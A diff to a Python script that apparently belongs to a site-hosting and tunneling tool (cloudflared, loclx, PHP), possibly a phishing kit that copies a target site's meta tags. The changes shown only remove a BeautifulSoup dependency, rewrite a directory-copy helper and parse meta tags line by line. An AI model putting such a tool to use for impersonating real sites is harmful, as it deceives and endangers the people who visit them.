@@ -52,6 +52,7 @@ from os import (
     getenv,
     kill,
     listdir,
+    makedirs,
     mkdir,
     mknod,
     popen,
@@ -71,6 +72,7 @@ from os.path import (
 from platform import uname
 from re import search, sub
 from shutil import (
+    copy as cp,
     copy2,
     copyfile,
     copytree,
@@ -159,7 +161,7 @@ lx_help = f"""
 """
 
 packages = [ "git", "php", "ssh" ]
-modules = [ "requests", "bs4", "rich" ]
+modules = [ "requests", "rich" ]
 tunnelers = [ "cloudflared", "loclx" ]
 processes = [ "php", "ssh", "cloudflared", "loclx", "localxpose", ]
 extensions = [ "png", "gif", "webm", "mkv", "mp4", "mp3", "wav", "ogg" ]
@@ -195,7 +197,6 @@ for module in modules:
         print(f"{module} cannot be installed! Install it manually by {green}'pip3 install {module}'")
         exit(1)
 
-from bs4 import BeautifulSoup
 from requests import ( 
     get,
     head, 
@@ -360,7 +361,13 @@ def copy(path1, path2):
     if isdir(path1):
         if isdir(path2):
              rmtree(path2)
-        copytree(path1, path2)
+        #copytree(path1, path2)
+        for item in listdir(path1):
+            old_file = f"{path1}/{item}"
+            new_file = f"{path2}/{item}"
+            if not isdir(dirname(new_file)):
+                makedirs(dirname(new_file))
+            cp(old_file, new_file)
     if isfile(path1):
         if isdir(path2):
             copy2(path1, path2)
@@ -532,10 +539,9 @@ def get_meta(url):
     allmeta = ""
     try:
         response = get(url, headers=headers).text
-        soup = BeautifulSoup(response, "html.parser")
-        metas = soup.find_all("meta")
-        if metas is not None and metas!=[]:
-            allmeta = "\n".join([str(meta) for meta in metas])
+        for line in response.split("\n"):
+            if line.strip().startswith("<meta "):
+                allmeta += line + "\n"
     except Exception as e:
         append(e, error_file)
     return allmeta
